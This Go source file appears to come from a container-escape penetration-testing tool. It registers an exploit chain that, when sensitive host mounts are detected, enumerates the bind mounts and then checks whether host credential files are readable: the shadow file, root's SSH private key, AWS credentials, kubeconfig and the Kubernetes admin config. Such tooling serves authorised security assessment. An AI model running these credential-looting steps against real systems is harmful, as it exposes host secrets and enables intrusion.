package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// sensitiveMountsLoot — host paths bind-mounted into the container often
// expose credential material directly, no further escape needed.
type sensitiveMountsLoot struct{ exploit.Base }

func (c *sensitiveMountsLoot) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "container.mounts.sensitive") {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"container.mounts.sensitive"},
		Confidence: "medium",
	}
}

func (c *sensitiveMountsLoot) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title: "Enumerate the bind-mounted host paths",
			Command: `cat /proc/self/mountinfo | awk '{print $5, $8, $9}' | sort -u`,
			Note:    "/host, /host/etc, /host/var/run, /var/run/docker.sock are the usual suspects.",
		},
		{
			Title: "Loot the mounted paths (read-only is enough)",
			Command: `for p in /host/etc/shadow /host/etc/passwd /host/root/.ssh/id_rsa \
    /host/root/.aws/credentials /host/root/.kube/config \
    /host/etc/kubernetes/admin.conf; do
  [[ -r "$p" ]] && echo "READABLE: $p"
done`,
			Note: "These are the high-value targets; if any are readable from inside, the engagement is effectively over.",
		},
	}
}

func init() {
	exploit.Register(&sensitiveMountsLoot{Base: exploit.Base{
		IDValue:       "chain.sensitive_mounts_loot",
		NameValue:     "Sensitive host mounts → credential loot",
		GoalValue:     "Read host SSH keys, shadow, AWS credentials, kubeconfig from bind mounts.",
		RiskValue:     exploit.RiskPassive,
		SeverityValue: check.SeverityHigh,
		ReferencesValue: []string{
			"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security",
		},
		AttackValue: []string{"T1552", "T1611"},
	}})
}
